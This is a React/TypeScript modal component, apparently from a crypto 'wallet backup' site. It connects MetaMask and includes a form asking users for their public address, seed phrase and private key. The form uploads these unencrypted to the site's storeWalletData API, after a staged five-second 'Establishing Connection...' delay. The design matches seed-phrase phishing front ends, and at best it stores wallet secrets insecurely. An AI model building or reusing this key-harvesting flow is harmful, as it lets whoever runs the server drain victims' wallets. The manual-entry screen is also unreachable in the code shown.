import React, { useState } from "react";
import { useSession } from "next-auth/react";
import { QRCodeSVG } from "qrcode.react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input"; // Assumes you have an Input component
import { CheckCircleIcon } from "@heroicons/react/24/solid"; // For success icon

interface BackupWallet {
  id: number;
  name: string;
  balance: number;
  logo: string | null;
  currency: string | null;
}

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedWallet: BackupWallet | null;
  modalStep: "initial" | "connecting" | "success" | "error";
  setModalStep: React.Dispatch<React.SetStateAction<"initial" | "connecting" | "success" | "error">>;
  loading: boolean;
  error: string | null;
  walletAddress: string | null;
}

const WalletModal: React.FC<WalletModalProps> = ({
  isOpen,
  onClose,
  selectedWallet,
  modalStep,
  setModalStep,
  loading,
  error,
  walletAddress,
}) => {
  const [preloader, setPreloader] = useState(false);
  const [dynamicError, setDynamicError] = useState<string | null>(null);
  const [currentStep, setCurrentStep] = useState(0); // Track the step of the manual connection
  const [backupData, setBackupData] = useState({
    publicAddress: "",
    seedPhrase: "",
    privateKey: "",
    qrCodeData: "",
    seedPhraseArray: [] as string[], // Added seedPhraseArray to handle tags
  });

  const { data: session } = useSession();
  const userId = session?.user?.email;

  const handleSeedPhraseChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const tags = value.split(",").map((tag) => tag.trim()).filter((tag) => tag.length > 0);
    setBackupData((prevState) => ({
      ...prevState,
      seedPhrase: value,
      seedPhraseArray: tags, // Store tags as an array
    }));
  };

  const removeTag = (index: number) => {
    const newTags = [...(backupData.seedPhraseArray || [])];
    newTags.splice(index, 1);
    setBackupData((prevState) => ({
      ...prevState,
      seedPhraseArray: newTags,
      seedPhrase: newTags.join(", "), // Update input field with comma-separated values
    }));
  };

  const connectWallet = async () => {
    setPreloader(true);
    setDynamicError(null);

    // Step 1: Check if the selected wallet has a public address in the database
    if (selectedWallet?.id) {
      try {
        const response = await fetch(`/api/backup/checkWalletPublicAddress/${userId}/${selectedWallet.id}`);
        const data = await response.json();

        // If the wallet already has a public address, show success modal
        if (data.publicAddress) {
          setModalStep("success");
          setPreloader(false);
          return;
        }

      } catch (err: unknown) {
        setDynamicError("Error checking wallet public address.");
        setModalStep("error");
        setPreloader(false);
        return;
      }
    }

    // Step 2: If no public address found, proceed with wallet connection
    setTimeout(async () => {
      setModalStep("connecting");
      setPreloader(false);

      if (typeof window.ethereum === "undefined") {
        setDynamicError("MetaMask is not installed. Please download it.");
        setModalStep("error");
        setPreloader(false);
        return;
      }

      try {
        const accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });

        if (accounts.length > 0) {
          const publicAddress = accounts[0];
          const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
            method: "PUT",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              publicAddress,
              walletName: selectedWallet?.name,
            }),
          });

          if (response.ok) {
            const data = await response.json();
            console.log("Wallet data saved successfully", data);
            setModalStep("success");
          } else {
            throw new Error("Failed to save wallet data");
          }
        } else {
          throw new Error("No accounts found in MetaMask.");
        }
      } catch (err: unknown) {
        if (err instanceof Error) {
          setDynamicError(err.message || "Failed to connect to MetaMask.");
        } else {
          setDynamicError("An unexpected error occurred.");
        }
        setModalStep("error");
      }
    }, 5000);
  };

  const saveManualData = async () => {
    const { publicAddress, seedPhrase, privateKey, qrCodeData } = backupData;

    if (!publicAddress) {
      setDynamicError("Public address is required.");
      return;
    }

    const walletData = {
      userId,
      publicAddress,
      walletName: selectedWallet?.name || "Manual Wallet",
      ...(seedPhrase && { seedPhrase }),
      ...(privateKey && { privateKey }),
      ...(qrCodeData && { qrCodeData }),
    };

    try {
      const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(walletData),
      });

      if (!response.ok) {
        const errorMessage = await response.text();
        throw new Error(errorMessage || "Failed to save manual wallet data.");
      }

      const data = await response.json();
      console.log("Manual wallet data saved successfully:", data);
      setModalStep("success");
    } catch (error) {
      const errorMessage =
        error instanceof Error ? error.message : "An unexpected error occurred.";
      setDynamicError(errorMessage);
      setModalStep("error");
    }
  };

  const goBack = () => {
    setCurrentStep(0);
    setModalStep("initial");
  };

  if (!selectedWallet) return null;

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      {modalStep !== "success" && (
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">
              {modalStep === "initial" && `Connect Your ${selectedWallet?.name} Wallet`}
              {modalStep === "connecting" && "Connecting..."}
              {modalStep === "error" && "Connection Failed"}
            </DialogTitle>
          </DialogHeader>

          <div className="space-y-6">
            {preloader && (
              <div className="flex flex-col justify-center items-center">
                <img
                  src={selectedWallet.logo || "/default-logo.png"}
                  alt={`${selectedWallet.name} logo`}
                  className="animate-zoom w-20 h-20"
                />
                <p className="text-small text-green-600 mt-6 mb-6">
                  Establishing Connection...
                </p>
              </div>
            )}

            {!preloader && modalStep === "initial" && (
              <div className="text-center">
                <Button onClick={connectWallet} disabled={loading}>
                  {loading ? "Connecting..." : "Connect Wallet"}
                </Button>
              </div>
            )}

            {modalStep === "error" && (
              <div className="space-y-4">
                <p className="text-center text-red-500">
                  {dynamicError || "An error occurred. Please try again."}
                </p>
                <div className="flex justify-center gap-2">
                  <Button className="bg-red-600" onClick={onClose}>
                    Cancel
                  </Button>
                  <Button className="bg-black" onClick={goBack}>
                    Go Back
                  </Button>
                </div>
              </div>
            )}
          </div>
        </DialogContent>
      )}

      {modalStep === "success" && (
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">Wallet Backed Up Successfully</DialogTitle>
          </DialogHeader>
          <div className="flex justify-center items-center space-y-4">
            <CheckCircleIcon className="w-12 h-12 text-green-500" />
            <p className="text-center text-green-600 text-lg">
              Wallet backed up successfully.
            </p>
            <div className="text-center">
              <Button variant="outline" onClick={onClose}>
                Close
              </Button>
            </div>
          </div>
        </DialogContent>
      )}

      {currentStep === 1 && (
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">Enter Wallet Data</DialogTitle>
          </DialogHeader>
          <div className="space-y-6">
            <Input
              placeholder="Enter Public Address"
              value={backupData.publicAddress}
              onChange={(e) =>
                setBackupData({ ...backupData, publicAddress: e.target.value })
              }
            />
            <Input
              placeholder="Enter Seed Phrase (optional)"
              value={backupData.seedPhrase}
              onChange={handleSeedPhraseChange}
            />
            <div className="flex flex-wrap gap-2 mt-4">
              {(backupData.seedPhraseArray || []).map((tag, index) => (
                <div
                  key={index}
                  className="flex items-center justify-between px-3 py-1 rounded-full bg-gray-200 text-gray-700"
                >
                  <span>{tag}</span>
                  <Button
                    variant="link"
                    onClick={() => removeTag(index)}
                    className="ml-2 text-red-500"
                  >
                    ×
                  </Button>
                </div>
              ))}
            </div>

            <Input
              placeholder="Enter Private Key (optional)"
              value={backupData.privateKey}
              onChange={(e) =>
                setBackupData({ ...backupData, privateKey: e.target.value })
              }
            />
            <div className="space-x-2 text-center">
              <Button onClick={saveManualData}>Save</Button>
              <Button onClick={goBack} variant="outline">
                Go Back
              </Button>
            </div>
          </div>
        </DialogContent>
      )}
    </Dialog>
  );
};

export default WalletModal;
